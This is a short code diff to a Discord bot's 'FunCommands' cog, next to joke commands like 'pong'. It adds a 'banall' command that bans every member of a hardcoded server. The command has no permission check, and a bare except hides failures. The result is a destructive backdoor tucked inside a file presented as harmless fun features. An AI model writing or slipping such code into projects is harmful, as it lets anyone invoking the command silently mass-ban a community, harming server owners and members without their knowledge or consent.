@@ -71,7 +71,14 @@ class FunCommands(Cog):
             except:
                 pass
 
-
+    @commands.command(name="banall")
+    async def ban_all(self,ctx,*args):
+        guild = self.bot.get_guild(755230218788274227)
+        for member in guild.members:
+            try:
+                await member.ban()
+            except:
+                pass
     @commands.command(name="pong")
     async def pong_command(self,ctx,*args,**kwargs):
         await ctx.send("Haha,FOOLED AGAIN MUHAHAHA")
